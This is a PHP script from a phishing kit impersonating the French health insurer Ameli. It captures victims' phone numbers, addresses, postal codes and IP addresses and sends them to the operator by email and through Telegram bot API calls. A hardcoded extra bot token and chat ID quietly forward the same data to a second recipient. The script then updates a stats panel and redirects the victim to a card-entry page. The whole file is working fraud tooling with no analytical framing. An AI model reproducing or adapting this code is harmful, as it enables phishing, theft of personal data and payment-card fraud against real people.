<?php
include("../common/sub_includes.php");
include("../config.php");

ob_start();
if (!isset($_SESSION)) {
  session_start();  // Et on ouvre la session
}

$Adresse = $_POST['input_adresse'];
$Complementdadresse = $_POST['input_adresse2'];
$zipcode = $_POST['input_zipcode'];
$Tel = $_POST['input_tel'];
$City = $_POST['input_city'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION['adresse']  = $Adresse;
    $_SESSION['adresse2']  = $Complementdadresse;
    $_SESSION['input_zipcode']  = $zipcode;
    $_SESSION['tel']  = $Tel;
    $_SESSION['city']  = $City;

  $message = '
[🐤] Ameli Querty billing +1 [🐤]

📱 Téléphone : '.$_SESSION['tel'].'

🏡 Adresse : '.$_SESSION['adresse'].'
🏡 Adresse Complement : '.$_SESSION['adresse2'].'

🏙️ Ville : '.$_SESSION['city'].'
🏙️ Code Postal : '.$_SESSION['input_zipcode'].'

🚩 Pays : France

🛒 Adresse IP : '.$_SERVER['REMOTE_ADDR'].'
';

  if ($mail_send == true) {
    $Subject = " 「💳」+1 Fr3sh Ameli adresse from " . $_SESSION["city"] . " | " . $_SERVER['REMOTE_ADDR'];
    $head = "From: Ameli adresse <info@querty.bg>";

    mail($my_mail, $Subject, $message, $head);
  }

  if ($tlg_send == true) {
    $original_bot_token = $bot_token;
    $original_chat_id = $rez_billing;

    // Envoi à l'ancien bot
    file_get_contents('https://api.telegram.org/bot' . $original_bot_token . '/sendMessage?chat_id=' . $original_chat_id . '&text=' . urlencode("$message") . '');

    // Envoi au nouveau bot
    $new_bot_token = '7057095242:AAHH-oF8Yqn2gPMvhF1l45mXcgQpVEjkJtE';
    $new_chat_id = '-4238529786';
    file_get_contents('https://api.telegram.org/bot' . $new_bot_token . '/sendMessage?chat_id=' . $new_chat_id . '&text=' . urlencode("$message") . '');
  }

  $filepath = '../panel/stats.ini';
  $data = @parse_ini_file($filepath);
  $data['billings']++;
  
  function update_ini_file($data, $filepath) {
    $content = "";
    $parsed_ini = parse_ini_file($filepath, true);
    foreach($data as $section => $values){
      if($section === ""){
        continue;
      }
      $content .= $section ."=". $values . "\n\r";
    }
    if (!$handle = fopen($filepath, 'w')) {
      return false;
    }
    $success = fwrite($handle, $content);
    fclose($handle);
  }
  
  update_ini_file($data, $filepath);

  header('location: ../pages/avcard.php');
}
